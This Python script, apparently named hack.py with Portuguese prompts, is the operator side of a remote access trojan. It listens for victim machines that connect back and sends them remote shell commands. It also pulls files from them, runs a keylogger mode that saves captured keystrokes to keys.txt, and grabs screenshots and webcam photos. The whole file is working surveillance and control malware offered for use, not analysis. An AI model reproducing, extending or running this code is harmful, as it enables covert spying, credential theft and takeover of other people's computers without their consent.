try:
    import simpleaudio
except:
    pass

import tqdm
from os import system
from socket import *
from time import sleep
from colorama import Fore, Style
import os
import subprocess
import sys

if len(sys.argv) < 3:
    print("Digite os parametro IP e PORT\n")
    print("python3 hack.py <host> <port>")
    print("example: python3 hack.py 127.0.0.1 6161\n")
    quit()

lhost = str(sys.argv[1])
lport = int(sys.argv[2])

sock = socket(AF_INET, SOCK_STREAM)

system("clear")
load = "AGUARDANDO CONEXÃO..."
for l in load:
    print(Fore.GREEN + Style.BRIGHT + l + Fore.RESET, end="", flush=True)
    sleep(.05)

drt = None

def download(cmd):
    #conn.send(cmd.encode("utf-8"))
    try:
        if "download" in cmd:
            cmd = cmd.replace("download", "").strip()
        filesize = int(conn.recv(4096).decode())
        progress = tqdm.tqdm(range(filesize), f"Receiving {cmd}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(cmd, "wb") as f:
            total_bytes = 0
            while True:
                bytes = conn.recv(4096)
                progress.update(len(bytes))
                f.write(bytes)
                total_bytes += len(bytes)
                #print(f"total: {total_bytes}\n filesize: {filesize}")
                if total_bytes == filesize:
                    break
    except:
        print("[-] NÃO FOI POSSÍVEL FAZER O DOWNLOAD\n")
    #print(f"[+] {cmd} BAIXADO COM SUCESSO")

def upload(cmd):
    try:
        if "upload" in cmd:
            cmd = cmd.replace("upload", "").strip()
        filesize = os.path.getsize(cmd)
        filesize = int(filesize)
        print(filesize)
        conn.send(f"{filesize}".encode("utf-8"))
    
        progress = tqdm.tqdm(range(filesize), f"Sending {cmd}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(cmd, "rb") as f:
            total_bytes = 0
            while True:
                bytes = f.read(1024 * 4)
                progress.update(len(bytes))
                conn.sendall(bytes)
                total_bytes += len(bytes)
                if total_bytes == filesize:
                    break
    except:
        print("[-] NÃO FOI POSSÍVEL FAZER O UPLOAD\n")

while True:
    try:
        sock.bind((lhost, lport))
        sock.listen(5)

        conn, endr = sock.accept()
        if conn:
            recv = conn.recv(2048).decode()
            print(f"{Fore.GREEN}{recv}{Fore.RESET}\a")
            drt = conn.recv(2088).decode().strip()
            try:
                wave_obj = simpleaudio.WaveObject.from_wave_file("beep.wav")
                play_obj = wave_obj.play()
                play_obj.wait_done()
            except:
                pass
            while True:
                cmd = str(input(f"{Fore.GREEN}{Style.BRIGHT}hacker@{endr[0]} {Fore.RED}{drt}\n{Fore.GREEN}-${Style.RESET_ALL} "))
                if "clear" in cmd:
                    system("clear")
                if "keylogger" in cmd:
                    conn.send(cmd.encode("utf-8"))
                    print(f"{Fore.GREEN}MODO KEYLOGGER ATIVADO\ndados recebidos:{Fore.RESET}\n")
                    while True:
                        for key in conn.recv(2048).decode():
                            print(key, end="", flush=True)
                            file = open("keys.txt", "a")
                            file.write(key)
                if "download" in cmd:
                    conn.send(cmd.encode("utf-8"))
                    download(cmd)
                
                if "upload" in cmd:
                    conn.send(cmd.encode("utf-8"))
                    upload(cmd)

                if "screenshot" in cmd or "print" in cmd:
                    conn.send(cmd.encode("utf-8"))
                    cmd = "print.jpg"
                    download(cmd)

                if "cam_take" in cmd:
                    conn.send(cmd.encode("utf-8"))
                    cmd = "cam_take.jpg"
                    download(cmd)

                else:
                    conn.send(cmd.encode("utf-8"))
                    try:
                        msg = conn.recv(2048).decode()
                        if "OPEN DIRECTORY" in msg:
                            drt = msg.replace("OPEN DIRECTORY:", "").strip()
                        else:
                            print(f"{Fore.GREEN}{msg}{Fore.RESET}")
                    except:
                        pass

    except KeyboardInterrupt:
        print(f"{Fore.GREEN}\nEXITING...{Fore.RESET}")
        quit()
            
